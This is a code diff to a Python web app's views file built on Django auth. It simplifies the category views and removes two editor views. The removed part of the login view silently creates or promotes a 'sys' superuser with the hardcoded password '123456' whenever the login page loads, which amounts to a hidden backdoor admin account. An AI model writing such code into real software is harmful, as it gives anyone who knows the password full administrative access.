@@ -13,7 +13,6 @@ import json
 import importlib
 import sqlalchemy
 
-
 from datetime import date, datetime
 import quicky
 application=quicky.applications.get_app_by_file(__file__)
@@ -28,19 +27,6 @@ def index(request):
 
 @quicky.view.template("login.html")
 def login(request):
-    from django.contrib.auth.models import User
-    try:
-        sys_user=User.objects.get(username='sys')
-        sys_user.is_staff = True
-        sys_user.is_superuser = True
-        sys_user.save()
-    except Exception as ex:
-        user = User.objects.create_user(username='sys',
-                                        email='sys@beatles.com',
-                                        password='123456')
-        user.is_staff = True
-        user.is_superuser = True
-        user.save()
     _login = {
         "username":"",
         "password":"",
@@ -79,36 +65,10 @@ def login_to_template(request):
 
 @quicky.view.template("category.html")
 def load_categories(request,path):
-    form =importlib.import_module("{0}.forms.{1}".format(application.name,path))# get declare form at forms package
-    config=form.layout.get_config() # get config of form
+    form = getattr(forms, path)
     return request.render({
         "path": path.lower(),
-        "columns":form.layout.get_table_columns(),
-        "api_get_list":config.get("action_list","admin.api.categories/get_list")
-    })
-@quicky.view.template("category-editor.html")
-def load_category(request,path):
-    form = importlib.import_module("{0}.forms.{1}".format(application.name, path))
-    config = form.layout.get_config()
-    return request.render({
-        "path": path.lower(),
-        "form": form.layout.get_form(),
-        "get_col": form.layout.get_form_col,
-        "api_get_item": config.get("action_item", "admin.api.categories/get_item"),
-        "api_save_item": config.get("action_save_item", "admin.api.categories/save_item"),
-        "keys":config.get("keys", ["_id"]),
-    })
-@quicky.view.template("category-editor.html")
-def load_form(request,path):
-    form = importlib.import_module("{0}.forms.{1}".format(application.name, path))
-    config = form.layout.get_config()
-    return request.render({
-        "path": path.lower(),
-        "form": form.layout.get_form(),
-        "get_col": form.layout.get_form_col,
-        "api_get_item": config.get("action_item", "admin.api.categories/get_item"),
-        "api_save_item": config.get("action_save_item", "admin.api.categories/save_item"),
-        "keys":config.get("keys", ["_id"]),
+        "columns":form.layout.get_table_columns()
     })
 @quicky.view.template(
     file="dynamic.html",
